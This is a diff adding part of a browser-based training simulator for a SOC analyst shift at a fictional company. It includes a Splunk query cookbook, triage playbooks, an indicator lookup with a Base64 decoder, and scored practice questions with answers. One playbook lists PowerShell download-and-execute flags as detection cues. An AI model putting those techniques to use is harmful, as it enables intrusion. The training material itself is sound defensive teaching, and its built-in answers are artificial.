+   <ol><li><b>Triage:</b> what sources and how much data.</li><li><b>Timeline:</b> when did volume spike.</li><li><b>Anomalies:</b> which field values look wrong.</li><li><b>Filter:</b> remove known-good until the odd stuff stands out.</li><li><b>Narrow:</b> rank suspects with stats, sort and head.</li><li><b>Trace:</b> follow one suspect through time with table.</li><li><b>Correlate:</b> confirm in a second log source, then measure impact.</li></ol>
+  </div>
+  ${COOKBOOK.map(r=>`<div class="card recipe"><div class="mono muted" style="font-size:12px">${esc(r.stage)}</div><h3 style="margin:0">${esc(r.title)}</h3>
+    <div class="row"><pre class="raw">${esc(r.q)}</pre><button class="btn primary" data-hunt='${escA(r.q)}'>Run</button></div>
+    <ul>${r.how.map(h=>`<li>${h}</li>`).join("")}</ul>
+    <div class="room">Room version: ${esc(r.room)}</div></div>`).join("")}
+  <div class="card prose" style="max-width:none"><h2>Pipe command reference</h2><div class="tbl-wrap"><table>
+   <tr><th>Command</th><th>What it does</th><th>Example</th></tr>
+   ${[["stats","Group and calculate: count, sum, avg, min, max, dc (distinct count), values","| stats count by host"],
+      ["timechart","Count or sum per time bucket","| timechart span=1m count"],
+      ["table","Show only these columns, in this order","| table _time, host, Image"],
+      ["sort","Order rows. - for descending","| sort -count"],
+      ["reverse","Flip the current order","| reverse"],
+      ["head / tail","First or last N rows (default 10)","| head 5"],
+      ["top","Most common values with count and percent","| top limit=5 DestinationIp"],
+      ["dedup","Keep the first event per value","| dedup DestinationIp"]].map(([c,w,e])=>`<tr><td class="mono">${c}</td><td>${w}</td><td class="mono">${esc(e)}</td></tr>`).join("")}
+  </table></div>
+  <h3>Search operators</h3><ul>
+   <li><code>field="value"</code>, <code>field!="value"</code>, <code>bytes_out&gt;10000</code> (also <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code>)</li>
+   <li><code>field IN ("a", "b*")</code> matches any value in the list</li>
+   <li><code>A OR B</code>, <code>NOT field="x"</code>. A space between filters means AND</li>
+   <li><code>*</code> wildcard: <code>"*.exe"</code> ends with, <code>"10.*"</code> starts with, <code>"*enc*"</code> contains</li>
+   <li>A bare word or <code>"quoted phrase"</code> searches all fields</li></ul>
+  <p class="hint">This console supports a subset of SPL. Real Splunk also has <code>eval</code>, <code>where</code>, <code>rex</code>, <code>bin</code>, <code>transaction</code> and more, which come up in TryHackMe's Incident Handling with Splunk room.</p></div>
+  <div class="card prose" style="max-width:none"><h2>Practice questions</h2><p class="hint">Same style as the room's questions. Run the shift to the end first, then answer with a query.</p>
+  ${QUIZ.map(([q,a,h],i)=>`<details class="pb" style="margin-top:8px"><summary>${i+1}. ${esc(q)}</summary><p><b>Answer:</b> ${esc(a)}</p><div class="recipe"><div class="row"><pre class="raw">${esc(h)}</pre><button class="btn" data-hunt='${escA(h)}'>Run</button></div></div></details>`).join("")}
+  </div></div>`;
+}
+
+function b64decode(s){
+  try{ const bin=atob(s.trim()); const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
+    const utf16 = bytes.length>1 && bytes[1]===0; return new TextDecoder(utf16?"utf-16le":"utf-8").decode(bytes); }catch(e){ return null; }
+}
+function vIntel(){
+  const key=intelInput.trim().toLowerCase(); const hit=key?INTEL[key]:null;
+  let res="";
+  if(key){
+    if(hit) res=`<div class="verdict ${hit.v==="malicious"?"bad":"good"}"><div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap"><span class="pill ${hit.v==="malicious"?"bad":"good"}">${hit.v.toUpperCase()}</span><span class="mono">${esc(intelInput.trim())}</span><span class="mono muted">${hit.score} engines flagged</span></div><p>${esc(hit.note)}</p><div>${hit.tags.map(t=>`<span class="pill">${esc(t)}</span>`).join(" ")}</div></div>`;
+    else res=`<div class="verdict unk"><span class="pill">NO DATA</span> <span class="mono">${esc(intelInput.trim())}</span><p class="muted">No reputation data. Unknown is not the same as safe; decide from context.</p></div>`;
+  }
+  return topbar()+`<div class="grid two">
+   <div class="card"><h2>Reputation lookup</h2><form class="q" id="iform"><input id="iin" value="${esc(intelInput)}" placeholder="IP, domain or SHA-256" aria-label="Indicator"><button class="btn primary">Look up</button></form><div style="margin-top:12px">${res}</div>
+   <p class="hint">Works like VirusTotal or AbuseIPDB in the real world. Indicators in alerts are clickable and land here.</p></div>
+   <div class="card"><h2>Decoder</h2><p class="hint">Paste a Base64 blob (for example a PowerShell <code class="mono">-enc</code> argument). UTF-16LE is detected automatically, like CyberChef's “From Base64 → Decode text”.</p>
+   <textarea id="decIn" aria-label="Base64 input" spellcheck="false"></textarea><div style="margin-top:8px"><button class="btn" id="decBtn">Decode</button></div><pre class="raw" id="decOut">Output appears here.</pre></div>
+  </div>`;
+}
+
+function vDocs(){
+  return topbar()+`<div class="grid two"><div class="card prose"><h2>Redbud Freight environment</h2>
+  <p>Regional trucking and logistics company, Oklahoma City. 140 staff. Domain <code>redbudfreight.com</code>, AD domain <code>REDBUD</code>, internal range <code>10.20.0.0/16</code>.</p>
+  <h3>Key users and hosts</h3><div class="tbl-wrap"><table><tr><th>User</th><th>Role</th><th>Host</th><th>IP</th></tr>
+  <tr><td class="mono">j.harmon</td><td>Accounts payable</td><td class="mono">WKS-FIN-07</td><td class="mono">10.20.4.37</td></tr>
+  <tr><td class="mono">l.ortiz</td><td>HR generalist</td><td class="mono">WKS-HR-03</td><td class="mono">10.20.5.21</td></tr>
+  <tr><td class="mono">s.patel</td><td>Fleet ops, owns fuel card program</td><td class="mono">WKS-OPS-11</td><td class="mono">10.20.6.40</td></tr>
+  <tr><td class="mono">d.kim</td><td>IT administrator</td><td class="mono">IT-ADM-02</td><td class="mono">10.20.1.12</td></tr>
+  <tr><td class="mono">—</td><td>File server</td><td class="mono">fs01</td><td class="mono">10.20.0.15</td></tr>
+  <tr><td class="mono">—</td><td>Edge firewall (logs as <code>sourcetype="firewall"</code>)</td><td class="mono">FW-EDGE-01</td><td class="mono">10.20.0.1</td></tr></table></div>
+  </div><div class="card prose"><h2>Approved activity</h2>
+  <ul><li><b>CHG-2291</b>: d.kim runs <code>Get-AssetInventory.ps1</code> from <code>\\\\fs01\\it$\\scripts</code> on IT-ADM-02, weekdays 09:00–09:30. Uses ExecutionPolicy Bypass.</li></ul>
+  <h3>Approved senders and vendors</h3><ul>
+  <li>OKC Chamber of Commerce (<code>okchamber-events.org</code>) newsletters to all-staff</li>
+  <li>DocuSign (<code>docusign.net</code>) for contracts</li>
+  <li>Keystone Fleet Services: fuel card vendor, contact s.patel</li>
+  <li>Accounts payable never receives invoices from domains other than the vendor's own; Redbud does not bill itself.</li></ul>
+  <h3>Mail gateway</h3><p>Policy MAIL-07 quarantines mail that fails DMARC <i>and</i> carries an archive. It is applied per recipient group; Finance was excluded at the time of this shift due to a vendor exception.</p>
+  </div></div>`;
+}
+
+function vPlaybooks(){
+  return topbar()+`<div class="grid" style="max-width:860px">
+  <details class="pb" open><summary>Phishing triage</summary><ol>
+  <li>Check the sender domain carefully against the real one. Look for extra hyphens, swapped letters, added words.</li>
+  <li>Read SPF / DKIM / DMARC. A fail is a strong signal; a pass only proves the domain sent it, not that the domain is trustworthy.</li>
+  <li>Compare Reply-To with From. A mismatch to a free mail provider is a red flag.</li>
+  <li>Look up the sender domain, sender IP, URLs and attachment hashes in Threat intel.</li>
+  <li>Check delivery: delivered or quarantined? Then search SIEM for the recipient's host for file or process activity after delivery.</li>
+  <li>Check Documentation for approved senders.</li>
+  <li>Classify. Escalate a TP if it was delivered and could be acted on, or if there is evidence of interaction.</li></ol></details>
+  <details class="pb"><summary>Process and execution triage</summary><ol>
+  <li>Is the parent → child pair normal? (services.exe → svchost.exe is normal; winword.exe → powershell.exe is not.)</li>
+  <li>Read the full command line. Flags like <code>-enc</code>, <code>-w hidden</code>, <code>-nop</code>, <code>IEX</code>, <code>DownloadString</code> deserve attention.</li>
+  <li>Decode anything encoded.</li>
+  <li>Check the file path (System32 vs. AppData/Temp/Downloads), signature and hash.</li>
+  <li>Search SIEM for what happened 5 minutes before and after on that host.</li>
+  <li>Check Documentation for approved admin activity.</li></ol></details>
+  <details class="pb"><summary>Network triage</summary><ol>
+  <li>Which process made the connection? Browsers talking to the web is normal; PowerShell or an unknown exe talking to a raw IP is not.</li>
+  <li>Look up the destination IP / domain.</li>
+  <li>Look for regular intervals (beaconing) and DNS lookups that led to the IP: <code>Image="x.exe" EventID=3 | table _time, DestinationIp</code>.</li>
+  <li>Pivot to the firewall to confirm the traffic was allowed and how much left: <code>sourcetype="firewall" dest_ip="IP" | stats sum(bytes_out) by src_ip</code>.</li></ol></details>
+  <details class="pb"><summary>Escalation criteria</summary><ol>
+  <li>Escalate: confirmed malicious activity on a host, credentials possibly exposed, malicious mail delivered to a user, persistence, C2.</li>
+  <li>Don't escalate: false positives, or true positives that a control fully stopped with no further impact (document and link to the parent case).</li></ol></details></div>`;
+}
+
+function vReports(){
+  const closed=ALERTS.filter(a=>S.a[a.id]&&S.a[a.id].status==="closed");
+  const sc=score();
+  return topbar()+`<div class="card" style="margin-bottom:16px"><h2>Shift score ${sc.pts}/${sc.max||0}</h2><div class="bar"><i style="width:${sc.max?sc.pts/sc.max*100:0}%"></i></div><p class="hint">1 point for the right classification, 1 more for the right escalation decision.</p></div>
+  ${closed.length?`<div class="grid">${closed.map(a=>reportCard(a)).join("")}</div>`:`<div class="card"><p class="muted">No case reports yet. Close an alert from the queue to see feedback here.</p></div>`}`;
+}
+function reportCard(a){
+  const r=S.a[a.id].report; const cOk=r.cls===a.answer.cls, eOk=r.esc===a.answer.esc;
+  const mentioned=a.keys.filter(k=>(r.notes+" "+r.iocs).toLowerCase().includes(k.toLowerCase()));
+  return `<div class="card"><div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;justify-content:space-between"><h3 style="margin:0">${a.id} · ${esc(a.title)}</h3><div style="display:flex;gap:6px;flex-wrap:wrap"><span class="pill ${cOk?"good":"bad"}">You: ${r.cls} ${cOk?"✓":"✗ (answer "+a.answer.cls+")"}</span><span class="pill ${eOk?"good":"bad"}">Escalate: ${r.esc?"yes":"no"} ${eOk?"✓":"✗"}</span></div></div>
+  <p><b>Why:</b> ${esc(a.why)}</p>
+  <p class="hint">Key evidence a reviewer looks for: ${a.keys.map(k=>`<span class="pill ${mentioned.includes(k)?"good":""}">${esc(k)}</span>`).join(" ")} ${mentioned.length?"(green = in your report)":""}</p>
+  <details><summary class="hint" style="cursor:pointer">Your report</summary><pre class="raw">${esc(r.notes)}${r.iocs?"\n\nIOCs: "+esc(r.iocs):""}</pre></details></div>`;
+}
+
+function vGuide(){
+  return topbar()+`<div class="card prose"><h2>How this works</h2>
+  <p>This is a practice version of a Tier 1 SOC shift. Alerts arrive on a clock. Each one is either a <b>true positive</b> (real malicious activity) or a <b>false positive</b> (the rule fired but nothing bad happened). Your job is to decide which, decide whether it needs escalation to Tier 2 / incident response, and write a short case report that someone else could act on.</p>
+  <h3>A good case report answers</h3><ul><li><b>Who</b>: user and host affected</li><li><b>What</b>: what happened, in plain words</li><li><b>When</b>: timestamps</li><li><b>Where</b>: hosts, IPs, domains</li><li><b>Why</b> you reached your verdict: the specific evidence</li><li><b>IOCs</b>: indicators to block or hunt for</li></ul>
+  <h3>The loop for every alert</h3><ol><li>Read the alert fields.</li><li>Pivot into SIEM on the host, user, or indicator. Look at the minutes before and after.</li><li>Check indicators in Threat intel and decode anything encoded.</li><li>Check Documentation for what is normal here.</li><li>Decide, then write it down.</li></ol>
+  <h3>Mapping to the real tools</h3><ul><li>SIEM here ≈ Splunk / Elastic / Microsoft Sentinel. The query syntax is a working subset of Splunk SPL, pipes included (<code>| stats</code>, <code>| timechart</code>, <code>| table</code>, <code>| sort</code>, <code>| head</code>, <code>| top</code>). The <a href="#" data-go="spl">SPL cookbook</a> walks through each query type.</li>
+  <li>Sources: <code>email</code> (mail gateway), <code>sysmon</code> (endpoints), <code>wineventlog</code>, <code>proxy</code>, <code>firewall</code> (edge firewall with byte counts).</li><li>Sysmon EventIDs used: 1 process create, 3 network connection, 11 file create, 22 DNS query. Windows 4698 = scheduled task created.</li><li>Threat intel ≈ VirusTotal, AbuseIPDB, URLhaus. Decoder ≈ CyberChef.</li></ul>
+  <h3>Tips</h3><ul><li>Pause the clock whenever you want. Speed it up once you're comfortable.</li><li>Not every alert on a compromised host is malicious.</li><li>“No data” in threat intel means unknown, not clean.</li></ul>
+  <p class="hint">Scenario, company and people are fictional. IPs use reserved documentation ranges (198.51.100.0/24, 203.0.113.0/24). Progress saves in this browser.</p></div>`;
+}
+
+// ---------------- Drawer (alert detail + report form) ----------------
+function drawer(){
+  if(openId===null) return "";
+  const a=ALERTS.find(x=>x.id===openId); const s=st(a.id);
+  const isIOC=v=>INTEL[String(v).toLowerCase()];
+  const fields=Object.entries(a.fields).map(([k,v])=>`<dt>${k}</dt><dd>${isIOC(v)||/^[0-9a-f]{64}$/.test(v)||/^\d+\.\d+\.\d+\.\d+$/.test(v)?`<button class="chip" data-ioc="${esc(v)}" title="Look up in Threat intel">${esc(v)}</button>`:esc(v)}</dd>`).join("");
+  let body="";
+  if(s.status==="closed"){ body=reportCard(a); }
+  else if(drawerMode==="report"){
+    body=`<form class="form" id="rform">
+      <div><label class="t">Classification</label><div class="radios"><label><input type="radio" name="cls" value="TP" id="clsTP"><span>True positive</span></label><label><input type="radio" name="cls" value="FP" id="clsFP"><span>False positive</span></label></div></div>
+      <div><label class="t">Escalate to Tier 2?</label><div class="radios"><label><input type="radio" name="esc" value="yes" id="escY"><span>Yes</span></label><label><input type="radio" name="esc" value="no" id="escN"><span>No</span></label></div></div>
+      <div><label class="t" for="iocs">IOCs (comma separated)</label><input type="text" id="iocs" placeholder="e.g. 203.0.113.47, evil.example"></div>
+      <div><label class="t" for="notes">Case report: who, what, when, where, why</label><textarea id="notes" placeholder="At 09:16 j.harmon on WKS-FIN-07 received…"></textarea></div>
+      ${formErr?`<div class="err">${esc(formErr)}</div>`:""}
+      <div style="display:flex;gap:8px"><button class="btn primary">Close alert</button><button type="button" class="btn" data-mode="detail">Back to details</button></div></form>`;
+  } else {
+    body=`<div style="display:flex;gap:8px;flex-wrap:wrap">${s.status==="owned"?`<button class="btn primary" data-mode="report">Write case report</button>`:`<button class="btn primary" id="takeBtn">Assign to me</button>`}
+      ${a.hunt.map(q=>`<button class="btn" data-hunt='${esc(q)}'>SIEM: ${esc(q.length>34?q.slice(0,34)+"…":q)}</button>`).join("")}</div>`;
+  }
+  return `<div class="scrim" data-close="1"></div><aside class="drawer" role="dialog" aria-modal="true" aria-label="Alert ${a.id}">
+    <div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start"><div><div class="mono muted">ALERT ${a.id} · ${fmt(a.at)} · ${a.type}</div><h2>${esc(a.title)}</h2><span class="sev ${a.sev}">${a.sev}</span></div><button class="btn sm" data-close="1">Close</button></div>
+    <div class="card" style="background:var(--panel2)"><dl class="kv">${fields}</dl></div>${body}</aside>`;
+}
+
+// ---------------- Render + events ----------------
+const VIEWS={dashboard:vDashboard,queue:vQueue,siem:vSiem,spl:vSpl,intel:vIntel,docs:vDocs,playbooks:vPlaybooks,reports:vReports,guide:vGuide};
+function render(){
+  document.querySelectorAll(".nav[data-v]").forEach(b=>b.setAttribute("aria-current", b.dataset.v===S.view));
+  document.getElementById("main").innerHTML=VIEWS[S.view]();
+  document.getElementById("overlay").innerHTML=drawer();
+  updateCount();
+}
+function go(v){ S.view=v; save(); render(); document.getElementById("main").scrollTop=0; }
+
+document.addEventListener("click",e=>{
+  const t=e.target.closest("button,tr,a,div.scrim"); if(!t) return;
+  const d=t.dataset;
+  if(d.v){ go(d.v); return; }
+  if(d.go){ e.preventDefault(); go(d.go); return; }
+  if(t.id==="resetBtn"){ if(t.dataset.armed){ S=fresh(); save(); openId=null; toast("Scenario restarted"); render(); } else { t.dataset.armed=1; t.textContent="Click again to confirm"; setTimeout(()=>{t.textContent="Restart scenario"; delete t.dataset.armed;},3000);} return; }
+  if(d.speed){ S.speed=+d.speed; save(); render(); return; }
+  if(t.id==="pauseBtn"){ S.paused=!S.paused; save(); render(); return; }
+  if(d.alert){ openId=+d.alert; drawerMode="detail"; formErr=""; S.seen[openId]=1; save(); render(); return; }
+  if(d.close){ openId=null; render(); return; }
+  if(t.id==="takeBtn"){ const s=st(openId); s.status="owned"; s.owned=S.t; save(); render(); return; }
+  if(d.mode){ drawerMode=d.mode; formErr=""; render(); return; }
+  if(d.hunt){ siemQuery=d.hunt; openId=null; go("siem"); return; }
+  if(d.ioc){ intelInput=d.ioc; openId=null; go("intel"); return; }
+  if(d.q){ siemQuery=d.q; render(); return; }
+  if(d.add){ const parts=splitPipes(siemQuery); const h=parts[0].trim(); parts[0]=(!h||h==="*"?"":h+" ")+d.add; siemQuery=parts.join(" | "); render(); return; }
+  if(d.drill){ const h=splitPipes(siemQuery)[0].trim(); siemQuery=(!h||h==="*"?"":h+" ")+d.drill; render(); return; }
+  if(d.log!==undefined){ const r=document.getElementById("lx"+d.log); r.hidden=!r.hidden; return; }
+  if(t.id==="decBtn"){ const out=b64decode(document.getElementById("decIn").value); document.getElementById("decOut").textContent= out===null?"That isn't valid Base64. Copy only the blob after -enc.":out; return; }
+});
+document.addEventListener("keydown",e=>{
+  if(e.key==="Escape"&&openId!==null){openId=null;render();}
+  if(e.key==="Enter"&&e.target.dataset&&e.target.dataset.alert){openId=+e.target.dataset.alert;drawerMode="detail";render();}
+});
+document.addEventListener("submit",e=>{
+  e.preventDefault();
+  if(e.target.id==="qform"){ siemQuery=document.getElementById("qin").value||"*"; render(); }
+  if(e.target.id==="iform"){ intelInput=document.getElementById("iin").value; render(); }
+  if(e.target.id==="rform"){
+    const cls=(document.querySelector('input[name=cls]:checked')||{}).value;
+    const escv=(document.querySelector('input[name=esc]:checked')||{}).value;
+    const notes=document.getElementById("notes").value.trim(); const iocs=document.getElementById("iocs").value.trim();
+    if(!cls||!escv){ formErr="Pick a classification and an escalation decision."; render(); keep(notes,iocs,cls,escv); return; }
+    if(notes.length<40){ formErr="Write at least a couple of sentences: who, what, when, and why you decided."; render(); keep(notes,iocs,cls,escv); return; }
+    const s=st(openId); s.status="closed"; s.closedAt=S.t; s.report={cls,esc:escv==="yes",notes,iocs};
+    const a=ALERTS.find(x=>x.id===openId); save();
+    toast(cls===a.answer.cls?"Closed. Classification correct.":"Closed. Check the feedback.");
+    render();
+  }
+});
+function keep(n,i,c,e){ document.getElementById("notes").value=n; document.getElementById("iocs").value=i; if(c)document.getElementById("cls"+c).checked=true; if(e)document.getElementById(e==="yes"?"escY":"escN").checked=true; }
+
+render();
+</script>
+
+<script>if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("sw.js").catch(function(){});});}</script>
+</body></html>
